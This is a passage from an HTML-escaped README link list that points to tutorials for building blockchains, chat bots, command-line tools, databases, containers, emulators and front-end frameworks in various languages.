&lt;li&gt;&lt;a href="https://jeiwan.cc/posts/building-blockchain-in-go-part-1/" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Building Blockchain in Go&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@mycoralhealth/code-your-own-blockchain-in-less-than-200-lines-of-go-e296282bcffc" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Code your own blockchain in less than 200 lines of Go&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.codementor.io/codehakase/building-a-simple-blockchain-with-go-k7crur06v" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Building A Simple Blockchain with Go&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/programmers-blockchain/create-simple-blockchain-java-tutorial-from-scratch-6eeed3cb03fa" rel="nofollow"&gt;&lt;strong&gt;Java&lt;/strong&gt;: &lt;em&gt;Creating Your First Blockchain with Java&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/conradoqg/naivecoin"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;A cryptocurrency implementation in less than 1500 lines of code&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/nambrot/blockchain-in-js"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Build your own Blockchain in JavaScript&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/digital-alchemy-holdings/learn-build-a-javascript-blockchain-part-1-ca61c285821e" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Learn &amp;amp; Build a JavaScript Blockchain&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/SavjeeTutorials/SavjeeCoin"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Creating a blockchain with JavaScript&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackernoon.com/how-to-launch-your-own-production-ready-cryptocurrency-ab97cb773371" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;How To Launch Your Own Production-Ready Cryptocurrency&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.jsmonday.dev/articles/34/writing-a-blockchain-in-node-js" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Writing a Blockchain in Node.js&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@vasilyf/lets-implement-a-cryptocurrency-in-kotlin-part-1-blockchain-8704069f8580" rel="nofollow"&gt;&lt;strong&gt;Kotlin&lt;/strong&gt;: &lt;em&gt;Let’s implement a cryptocurrency in Kotlin&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackernoon.com/learn-blockchains-by-building-one-117428612f46" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Learn Blockchains by Building One&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ecomunsing.com/build-your-own-blockchain" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Build your own blockchain: a Python tutorial&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://adilmoujahid.com/posts/2018/03/intro-blockchain-bitcoin-python/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;A Practical Introduction to Blockchain with Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/crypto-currently/lets-build-the-tiniest-blockchain-e70965a248b" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Let’s Build the Tiniest Blockchain&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yukimotopress/programming-blockchains-step-by-step"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;Programming Blockchains Step-by-Step (Manuscripts Book Edition)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.freecodecamp.org/how-to-build-a-simple-actor-based-blockchain-aac1e996c177" rel="nofollow"&gt;&lt;strong&gt;Scala&lt;/strong&gt;: &lt;em&gt;How to build a simple actor-based blockchain&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://lhartikk.github.io/" rel="nofollow"&gt;&lt;strong&gt;TypeScript&lt;/strong&gt;: &lt;em&gt;Naivecoin: a tutorial for building a cryptocurrency&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://naivecoinstake.learn.uno/" rel="nofollow"&gt;&lt;strong&gt;TypeScript&lt;/strong&gt;: &lt;em&gt;NaivecoinStake: a tutorial for building a cryptocurrency with the Proof of Stake consensus&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-bot" class="anchor" aria-hidden="true" href="#build-your-own-bot"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Bot&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.haskell.org/Roll_your_own_IRC_bot" rel="nofollow"&gt;&lt;strong&gt;Haskell&lt;/strong&gt;: &lt;em&gt;Roll your own IRC bot&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@SeloSlav/how-to-make-a-scary-russian-twitter-bot-with-java-b7b62768a3ac" rel="nofollow"&gt;&lt;strong&gt;Java&lt;/strong&gt;: &lt;em&gt;How To Make a Scary Russian Twitter Bot With Java&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tutorials.botsfloor.com/creating-a-simple-facebook-messenger-ai-bot-with-api-ai-in-node-js-50ae2fa5c80d" rel="nofollow"&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: &lt;em&gt;Creating a Simple Facebook Messenger AI Bot with API.ai in Node.js&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.sohamkamani.com/blog/2016/09/21/making-a-telegram-bot/" rel="nofollow"&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: &lt;em&gt;How to make a responsive telegram bot&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://discordjs.guide/" rel="nofollow"&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: &lt;em&gt;Create a Discord bot&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.scottlogic.com/2017/05/22/gifbot-github-integration.html" rel="nofollow"&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: &lt;em&gt;gifbot - Building a GitHub App&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.smashingmagazine.com/2017/08/ai-chatbot-web-speech-api-node-js/" rel="nofollow"&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: &lt;em&gt;Building A Simple AI Chatbot With Web Speech API And Node.js&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://apps.worldwritable.com/tutorials/chatbot/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Chatbot Fundamentals: An interactive guide to writing bots in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.fullstackpython.com/blog/build-first-slack-bot-python.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;How to Build Your First Slack Bot with Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/freehunch/how-to-build-a-slack-bot-with-python-using-slack-events-api-django-under-20-minute-code-included-269c3a9bf64e" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;How to build a Slack Bot with Python using Slack Events API &amp;amp; Django under 20 minute&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pythonforengineers.com/build-a-reddit-bot-part-1/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Build a Reddit Bot&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=krTUf7BpTc0" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;How To Make A Reddit Bot&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://khashtamov.com/en/how-to-create-a-telegram-bot-using-python/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;How To Create a Telegram Bot Using Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.freecodecamp.org/creating-a-twitter-bot-in-python-with-tweepy-ac524157a607" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Create a Twitter Bot in Python Using Tweepy&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLIFBTFgFpoJ9vmYYlfxRFV6U_XhG-4fpP" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Creating Reddit Bot with Python &amp;amp; PRAW&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://towardsdatascience.com/build-a-cryptocurrency-trading-bot-with-r-1445c429e1b1" rel="nofollow"&gt;&lt;strong&gt;R&lt;/strong&gt;: &lt;em&gt;Build A Cryptocurrency Trading Bot with R&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://habr.com/en/post/436254/" rel="nofollow"&gt;&lt;strong&gt;Rust&lt;/strong&gt;: &lt;em&gt;A bot for Starcraft in Rust, C or any other language&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-command-line-tool" class="anchor" aria-hidden="true" href="#build-your-own-command-line-tool"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Command-Line Tool&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://learnto.computer/screencasts/bsd-cat" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Rewriting the cat command from scratch&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://flaviocopes.com/go-git-contributions/" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Visualize your local git contributions with Go&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://flaviocopes.com/go-tutorial-lolcat/" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Build a command line app with Go: lolcat&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://flaviocopes.com/go-tutorial-cowsay/" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Building a cli command with Go: cowsay&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://flaviocopes.com/go-tutorial-fortune/" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Go CLI tutorial: fortune clone&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://xmonader.github.io/nimdays/day06_nistow.html" rel="nofollow"&gt;&lt;strong&gt;Nim&lt;/strong&gt;: &lt;em&gt;Writing a stow alternative to manage dotfiles&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-database" class="anchor" aria-hidden="true" href="#build-your-own-database"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Database&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cstack.github.io/db_tutorial/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Let's Build a Simple Database&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://codecapsule.com/2012/11/07/ikvs-implementing-a-key-value-store-table-of-contents/" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Implementing a Key-Value Store&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.codeproject.com/Articles/1029838/Build-Your-Own-Database" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;Build Your Own Database&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://aosabook.org/en/500L/an-archaeology-inspired-database.html" rel="nofollow"&gt;&lt;strong&gt;Clojure&lt;/strong&gt;: &lt;em&gt;An Archaeology-Inspired Database&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@marceloboeira/why-you-should-build-your-own-nosql-database-9bbba42039f5" rel="nofollow"&gt;&lt;strong&gt;Crystal&lt;/strong&gt;: &lt;em&gt;Why you should build your own NoSQL Database&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://aosabook.org/en/500L/dagoba-an-in-memory-graph-database.html" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Dagoba: an in-memory graph database&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://aosabook.org/en/500L/dbdb-dog-bed-database.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;DBDB: Dog Bed Database&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://charlesleifer.com/blog/building-a-simple-redis-server-with-python/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Write your own miniature Redis with Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-docker" class="anchor" aria-hidden="true" href="#build-your-own-docker"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Docker&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.lizzie.io/linux-containers-in-500-loc.html" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Linux containers in 500 lines of code&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.infoq.com/articles/build-a-container-golang" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Build Your Own Container Using Less than 100 Lines of Go&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=Utf-A4rODH8" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Building a container from scratch in Go&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Fewbytes/rubber-docker"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;A workshop on Linux containers: Rebuild Docker from Scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tonybaloney/mocker"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;A proof-of-concept imitation of Docker, written in 100% Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/p8952/bocker"&gt;&lt;strong&gt;Shell&lt;/strong&gt;: &lt;em&gt;Docker implemented in around 100 lines of bash&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-emulator--virtual-machine" class="anchor" aria-hidden="true" href="#build-your-own-emulator--virtual-machine"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Emulator / Virtual Machine&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.felixangell.com/virtual-machine-in-c/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Virtual machine in C&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://justinmeiners.github.io/lc3-vm/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Write your Own Virtual Machine&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cturt.github.io/cinoop.html" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Writing a Game Boy emulator, Cinoop&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.multigesture.net/articles/how-to-write-an-emulator-chip-8-interpreter/" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;How to write an emulator (CHIP-8 interpreter)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.codeslinger.co.uk/pages/projects/chip8.html" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Emulation tutorial (CHIP-8 interpreter)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.codeslinger.co.uk/pages/projects/gameboy.html" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Emulation tutorial (GameBoy emulator)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.codeslinger.co.uk/pages/projects/mastersystem/memory.html" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Emulation tutorial (Master System emulator)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stevelosh.com/blog/2016/12/chip8-cpu/" rel="nofollow"&gt;&lt;strong&gt;Common Lisp&lt;/strong&gt;: &lt;em&gt;CHIP-8 in Common Lisp&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://imrannazar.com/GameBoy-Emulation-in-JavaScript" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;GameBoy Emulation in JavaScript&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://omokute.blogspot.com.br/2012/06/emulation-basics-write-your-own-chip-8.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Emulation Basics: Write your own Chip 8 Emulator/Interpreter&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-front-end-framework--library" class="anchor" aria-hidden="true" href="#build-your-own-front-end-framework--library"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Front-end Framework / Library&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jasonformat.com/wtf-is-jsx/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;WTF is JSX (Let's Build a JSX Renderer)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hexacta/didact"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;A DIY guide to build your own React&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://vimeo.com/album/3930691" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Reverse Engineering React&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=_MAD4Oly9yg" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Building React From Scratch&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.javascripting.com/2016/10/05/building-your-own-react-clone-in-five-easy-steps/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Building Your Own React Clone in Five Easy Steps&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@sweetpalma/gooact-react-in-160-lines-of-javascript-44e0742ad60f" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Gooact: React in 160 lines of JavaScript&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mattgreer.org/articles/react-internals-part-one-basic-rendering/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;React Internals&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackernoon.com/learn-you-some-custom-react-renderers-aed7164a4199" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Learn how React Reconciler package works by building your own lightweight React DOM&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zapier.com/engineering/how-to-build-redux/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Build Yourself a Redux&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.jamasoftware.com/blog/lets-write-redux/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Let’s Write Redux!&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://egghead.io/lessons/react-redux-implementing-store-from-scratch" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Redux: Implementing Store from Scratch&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.mgechev.com/2015/03/09/build-learn-your-own-light-lightweight-angularjs/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Build Your own Simplified AngularJS in 200 Lines of JavaScript&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://teropa.info/blog/2013/11/03/make-your-own-angular-part-1-scopes-and-digest.html" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Make Your Own AngularJS&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@deathmood/how-to-write-your-own-virtual-dom-ee74acc13060" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;How to write your own Virtual DOM&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://mfrachet.github.io/create-frontend-framework/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Building a frontend framework, from scratch, with components (templating, state, VDOM)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pomb.us/build-your-own-react/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Build your own React&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
